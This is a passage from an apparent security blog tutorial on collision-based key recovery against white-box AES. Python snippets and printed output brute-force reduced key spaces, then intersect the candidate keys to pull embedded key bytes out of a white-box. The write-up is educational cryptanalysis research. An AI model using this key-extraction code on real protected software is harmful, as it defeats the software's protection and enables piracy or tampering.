class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">62</span><span class=\"p\">],</span>\n    <span class=\"p\">[</span><span class=\"mh\">0xde</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mh\">0xad</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mh\">0xbe</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mh\">0xef</span><span class=\"p\">],</span>\n<span class=\"p\">]</span>\n\n\n<span class=\"c1\"># Iterate over all the key space, to find one key that generate a collision</span>\n<span class=\"c1\"># on a plain AES.</span>\n<span class=\"k\">for</span> <span class=\"n\">key</span> <span class=\"ow\">in</span> <span class=\"n\">reduced_potential_keys</span><span class=\"p\">:</span>\n    <span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n    <span class=\"c1\"># Check if we have a collision on byte 0 (we could also look for collisions on bytes 1,2,3)</span>\n    <span class=\"k\">if</span> <span class=\"n\">s0</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]:</span>\n        <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"[PLAIN] Found a key that gives a collision on byte_0 for :\"</span><span class=\"p\">)</span>\n        <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n        <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n        <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"4-bytes-key is : </span><span class=\"si\">{key}</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\n[WHITEBOX] We have a collision between plaintexts (on byte_0):\nPlain0 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 27, 182, 186, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain1 =    [98, 0, 0, 0, 0, 78, 0, 0, 0, 0, 165, 0, 0, 0, 0, 52]\nstate =     [240, 21, 226, 121, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nSupposed \"Exhaustive\" lookup of potential keys over 2^32 possibilities.\n\n[PLAIN] Found a key that gives a collision on byte_0 for :\nPlain0 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [239, 26, 181, 185, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\n\nPlain1 =    [98, 0, 0, 0, 0, 78, 0, 0, 0, 0, 165, 0, 0, 0, 0, 52]\nstate =     [239, 20, 225, 120, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99, 99]\n\n4-bytes-key is : [222, 0, 0, 0, 0, 173, 0, 0, 0, 0, 190, 0, 0, 0, 0, 239]\n</pre> \n  <p>As we can see, when using the right key (the 4 bytes of the key involved actually), we observe a collision, both on the whiteboxed and plain AES, despite the presence of internal encodings. It works, but it is obviously not practical because of the number of keys we would need to test. So let’s try to make this attack a bit better, by reducing the key-space.</p> \n </div> \n <div class=\"section\" id=\"improving-collisions-based-attacks\"> \n  <h3>Improving collisions-based attacks</h3> \n  <div class=\"figure\"> \n   <img alt=\"too many keys\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/too_many_keys.jpg\" style=\"width: 432.0px; height: 324.75px;\" /> \n  </div> \n  <p>The main issue we have from the collision-based attack previously described, is that it would require to test all the potential keys over a range of <span class=\"math\">\\(2^{32}\\)</span> possibilities (Actually, even more, because to distinguish the key, we would need to do that multiple times).</p> \n  <p>Would it be possible to reduce it? For instance, to break the key bit by bit? Or byte by byte?</p> \n  <p>The idea is to reduce the number of keys we need to test. To do so, we need to find a way to get a few bytes of the key, out of the equation. To get to this result, we can experiment around by modifying only a single byte of input, and keep the rest of them static.</p> \n  <p>If we do so, we quickly realize that if we modify a single byte, we will never find a collision. (Iterating a single byte of input over <span class=\"math\">\\([0,255]\\)</span>, would result in the 4 impacted bytes to take all values in <span class=\"math\">\\([0,255]\\)</span>. If that was not the case, AES would be biased and not cryptographically secure).</p> \n  <p>So, we need to modify at least 2 bytes of input, to get a collision. Let’s have a look at the following collision where we modified only 2 <strong>input bytes</strong> (<span class=\"math\">\\(Ib_0\\)</span> and <span class=\"math\">\\(Ib_5\\)</span>), and kept the 2 remaining ones (<span class=\"math\">\\(Ib_{10}\\)</span> and <span class=\"math\">\\(Ib_{15}\\)</span>) at a fixed value (here the value is <span class=\"math\">\\(0\\)</span>).</p> \n  <p><img alt=\"reduced_collision\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES8.png\" style=\"width: 890.96px; height: 206.64000000000001px;\" /> <em>Whitebox collision with only 2 input bytes modified</em></p> \n  <p>We can easily identify a collision on the <strong>output byte</strong> <span class=\"math\">\\(Ob_0 = 240\\)</span>.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">207</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">198</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nPlain0 =    [207, 0, 0, 0, 0, 198, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 75, 193, 234, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain1 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 27, 182, 186, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n</pre> \n  <p>Now what happens if we decide to modify a third byte of the input?</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">data0</span><span class=\"p\">[</span><span class=\"mi\">10</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">10</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nPlain0 =    [207, 0, 0, 0, 0, 198, 0, 0, 0, 0, 10, 0, 0, 0, 0, 0]\nstate =     [205, 48, 135, 203, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain1 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 27, 182, 186, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n</pre> \n  <p>Without much surprise, the collision is no more. However, one interesting thing is that if we modify that third byte on both inputs, and we set it to the same value, the collision is back on <span class=\"math\">\\(Ob_0\\)</span>, but this time with a different value <span class=\"math\">\\(Ob_0 = 205\\)</span>. No matter what value we put in the two remaining bytes, if they are the same on both plaintexts, the collision will still happen.</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"n\">data0</span><span class=\"p\">[</span><span class=\"mi\">10</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">10</span>\n<span class=\"n\">data1</span><span class=\"p\">[</span><span class=\"mi\">10</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"mi\">10</span>\n\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nPlain0 =    [207, 0, 0, 0, 0, 198, 0, 0, 0, 0, 10, 0, 0, 0, 0, 0]\nstate =     [205, 48, 135, 203, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain1 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 0, 0, 0, 0]\nstate =     [205, 128, 244, 155, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n</pre> \n  <p>So what are we really observing, and what does it mean for the attack?</p> \n  <ul class=\"simple\"> \n   <li>The <span class=\"math\">\\(Ob_0\\)</span> value is dependent on <span class=\"math\">\\(Ib_0\\)</span>, <span class=\"math\">\\(Ib_5\\)</span>, <span class=\"math\">\\(Ib_{10}\\)</span>, and <span class=\"math\">\\(Ib_{15}\\)</span>.</li> \n  </ul> \n  <p>However:</p> \n  <ul class=\"simple\"> \n   <li>The <strong>existence of a collision</strong> is dependent only on the varying bytes (in our case <span class=\"math\">\\(Ib_0\\)</span> and <span class=\"math\">\\(Ib_5\\)</span>).</li> \n  </ul> \n  <p>I will not bother you (too much) with the maths, just think that <span class=\"math\">\\(b_0\\)</span> is computed as something similar to:</p> \n  <div class=\"math\">\n    \\begin{equation*} b_0 = f(x_0, k_0) \\oplus g(x_5, k_5) \\oplus h(x_{10}, k_{10}) \\oplus i(x_{15}, k_{15}) \\end{equation*} \n  </div> \n  <ul class=\"simple\"> \n   <li><span class=\"math\">\\(\\oplus\\)</span> being XOR</li> \n   <li><span class=\"math\">\\(x_i\\)</span> the input</li> \n   <li><span class=\"math\">\\(k_i\\)</span> the key</li> \n   <li><span class=\"math\">\\(i\\)</span> the byte index</li> \n   <li><span class=\"math\">\\(f, g, h, i\\)</span> are functions that come from all the AES operations, but we don’t really care about what they are doing, we just need to know they are different</li> \n  </ul> \n  <p>In our case, <span class=\"math\">\\(x_{10}\\)</span>, <span class=\"math\">\\(x_{15}\\)</span>, <span class=\"math\">\\(k_{10}\\)</span>, <span class=\"math\">\\(k_{15}\\)</span> are constant, so the last two terms are also constant and we end up with something like:</p> \n  <div class=\"math\">\n    \\begin{equation*} b_0 = f(x_0, k_0) \\oplus g(x_5, k_5) \\oplus C \\end{equation*} \n  </div> \n  <p>That constant <span class=\"math\">\\(C\\)</span> being the same on both plaintexts, we end up with a collision dependent only on <span class=\"math\">\\(x_0\\)</span>, <span class=\"math\">\\(x_5\\)</span>, <span class=\"math\">\\(k_0\\)</span> and <span class=\"math\">\\(k_5\\)</span>. And that is the last observation we need for the attack.</p> \n  <ul class=\"simple\"> \n   <li><em>Observation: We can compute collisions that depend only on a reduced part of the key, if we keep a part of the input constant.</em></li> \n  </ul> \n  <p>With this observation, we know that if a collision is happening, <span class=\"math\">\\(k_{10}\\)</span> and <span class=\"math\">\\(k_{15}\\)</span> are not relevant in the existence of the collision, since we fixed <span class=\"math\">\\(x_{10}\\)</span> and <span class=\"math\">\\(x_{15}\\)</span>.</p> \n  <p>So it means that:</p> \n  <ul class=\"simple\"> \n   <li>We find 2 plaintexts, that differ only on two bytes that generate a collision through the whitebox.</li> \n   <li>Then when we will look for the proper key, instead of trying all the potential keys over a <span class=\"math\">\\(2^{32}\\)</span> space, we will instead try to break 2 bytes of the key, reducing the potential keys to test to <span class=\"math\">\\(2^{16}\\)</span> possibilities (obviously, we need to run this twice, to break the 2 remaining bytes of key, so it is in the end <span class=\"math\">\\(2^{17}\\)</span> keys at most).</li> \n  </ul> \n  <p><img alt=\"reduced_wrong_key\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES9.png\" style=\"width: 890.96px; height: 206.08px;\" /> <em>Looking for a key generating collisions for the pair of plaintexts</em></p> \n  <p>Now we can get to a real key recovery (and can finally talk about the key distinguisher):</p> \n  <div class=\"highlight\"> \n   <pre><span></span><span class=\"c1\"># Colliding pair of plaintexts for the whitebox</span>\n<span class=\"n\">data1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n<span class=\"n\">data0</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">207</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">198</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n\n<span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">)</span>\n<span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">whitebox</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">)</span>\n\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain0 = </span><span class=\"se\">\\t</span><span class=\"si\">{data0}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s0}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"n\">F</span><span class=\"s2\">\"Plain1 = </span><span class=\"se\">\\t</span><span class=\"si\">{data1}</span><span class=\"se\">\\n</span><span class=\"s2\">state = </span><span class=\"se\">\\t</span><span class=\"si\">{s1}</span><span class=\"se\">\\n</span><span class=\"s2\">\"</span><span class=\"p\">)</span>\n\n<span class=\"c1\"># key to recover</span>\n<span class=\"n\">wb_key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">222</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">173</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">190</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">239</span><span class=\"p\">]</span>\n<span class=\"c1\"># Iterate over all the key space, to find one key that generates a collision</span>\n<span class=\"c1\"># on a plain AES.</span>\n<span class=\"n\">colliding_keys</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n<span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n    <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n        <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n        <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n        <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">j</span>\n        <span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n        <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">data1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n        <span class=\"c1\"># Check if we have a collision on byte 0 (we could also look for collisions on bytes 1,2,3)</span>\n        <span class=\"k\">if</span> <span class=\"n\">s0</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]:</span>\n            <span class=\"n\">colliding_keys</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>\n            <span class=\"k\">if</span> <span class=\"n\">wb_key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">i</span> <span class=\"ow\">and</span> <span class=\"n\">wb_key</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">j</span><span class=\"p\">:</span>\n                <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Key found !\"</span><span class=\"p\">)</span>\n                <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Key : </span><span class=\"se\">\\t\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n                <span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Wb_key : </span><span class=\"se\">\\t</span><span class=\"s2\">\"</span><span class=\"p\">,</span> <span class=\"n\">wb_key</span><span class=\"p\">)</span>\n                <span class=\"k\">break</span>\n<span class=\"nb\">print</span><span class=\"p\">(</span><span class=\"s2\">\"Number of potential keys found : \"</span><span class=\"p\">,</span> <span class=\"nb\">len</span><span class=\"p\">(</span><span class=\"n\">colliding_keys</span><span class=\"p\">))</span>\n</pre> \n  </div> \n  <pre class=\"literal-block\">\nPlain0 =    [207, 0, 0, 0, 0, 198, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 75, 193, 234, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nPlain1 =    [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nstate =     [240, 27, 182, 186, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255]\n\nKey found !\nKey :                [222, 0, 0, 0, 0, 173, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]\nWb_key :     [222, 12, 12, 12, 12, 173, 12, 12, 12, 12, 190, 12, 12, 12, 12, 239]\nNumber of potential keys found :  280\n</pre> \n  <p><img alt=\"reduced_right_key\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/AES10.png\" style=\"width: 890.96px; height: 206.64000000000001px;\" /> <em>Key generating a collision on the pair of plaintexts found</em></p> \n </div> \n <div class=\"section\" id=\"isolating-the-real-key\"> \n  <h3>Isolating the real key</h3> \n  <p>As we can see in the previous snippet, we manage to recover <span class=\"math\">\\(k_0\\)</span> and <span class=\"math\">\\(k_5\\)</span> based on the two colliding plaintexts we identified. That is pretty neat, however, as you noticed, we found 280 keys that were generating a collision... Here it was easy to identify the good one, since we know the key held in the whitebox (but usually that is not the case, otherwise we would not be here :D).</p> \n  <img alt=\"Key distinguish\" class=\"align-center\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_1.png\" style=\"width: 612.0px; height: 293.0px;\" /> \n  <p>So how can we distinguish the real key from the rest? Well this is actually quite simple. We just need a few more pairs of colliding inputs.</p> \n  <p>Indeed, for a given pair of plaintexts, there are many different keys that could yield a collision. However, for another given pair of plaintexts, there would also be many different keys, but they would not all be the same. If we do an intersection of the potential keys, we can find the only good key!</p> \n  <blockquote>\n    Note: You might need more than just two pairs of plaintexts to distinguish the real key. \n  </blockquote> \n  <p><img alt=\"potential_keys_2\" src=\"http://blog.quarkslab.com/resources/2020-06-30-whiteboxes-QBDI/img/kd_0.png\" style=\"width: 852.0400000000001px; height: 224.4px;\" /> <em>Isolate the good key by intersecting the potential keys for two pair of plaintexts</em></p> \n  <div class=\"section\" id=\"demonstration-of-the-attack\"> \n   <h4>Demonstration of the attack</h4> \n   <p>Below is a full example of how to perform the attack. To make it a bit cleaner to read, we pre-selected 3 pairs of colliding inputs.</p> \n   <div class=\"highlight\"> \n    <pre><span></span><span class=\"kn\">from</span> <span class=\"nn\">pprint</span> <span class=\"k\">import</span> <span class=\"n\">pprint</span>\n<span class=\"c1\"># Find all keys generating a collision for a given pair of input</span>\n<span class=\"k\">def</span> <span class=\"nf\">find_colliding_keys</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">p1</span><span class=\"p\">):</span>\n    <span class=\"c1\"># Iterate over all the key space, to find one key that generate a collision</span>\n    <span class=\"c1\"># on a plain AES.</span>\n    <span class=\"n\">colliding_keys</span> <span class=\"o\">=</span> <span class=\"p\">[]</span>\n    <span class=\"n\">ctr</span> <span class=\"o\">=</span> <span class=\"mi\">0</span>\n    <span class=\"k\">for</span> <span class=\"n\">i</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n        <span class=\"k\">for</span> <span class=\"n\">j</span> <span class=\"ow\">in</span> <span class=\"nb\">range</span><span class=\"p\">(</span><span class=\"mi\">256</span><span class=\"p\">):</span>\n            <span class=\"n\">key</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span><span class=\"o\">*</span><span class=\"mi\">16</span>\n            <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">i</span>\n            <span class=\"n\">key</span><span class=\"p\">[</span><span class=\"mi\">5</span><span class=\"p\">]</span> <span class=\"o\">=</span> <span class=\"n\">j</span>\n            <span class=\"n\">s0</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">p0</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n            <span class=\"n\">s1</span> <span class=\"o\">=</span> <span class=\"n\">aes_round_0</span><span class=\"p\">(</span><span class=\"n\">p1</span><span class=\"p\">,</span> <span class=\"n\">key</span><span class=\"p\">)</span>\n            <span class=\"c1\"># Check if we have a collision on byte 0 (we could also look for collisions on bytes 1,2,3)</span>\n            <span class=\"k\">if</span> <span class=\"n\">s0</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]</span> <span class=\"o\">==</span> <span class=\"n\">s1</span><span class=\"p\">[</span><span class=\"mi\">0</span><span class=\"p\">]:</span>\n                <span class=\"n\">colliding_keys</span><span class=\"o\">.</span><span class=\"n\">append</span><span class=\"p\">(</span><span class=\"n\">key</span><span class=\"p\">)</span>\n\n    <span class=\"k\">return</span> <span class=\"n\">colliding_keys</span>\n\n<span class=\"c1\"># Pair of colliding plaintexts</span>\n<span class=\"n\">input1</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">16</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">55</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">]</span>\n<span class=\"n\">input2</span> <span class=\"o\">=</span> <span class=\"p\">[</span><span class=\"mi\">12</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span class=\"p\">,</span> <span class=\"mi\">17</span><span class=\"p\">,</span> <span class=\"mi\">0</span><span 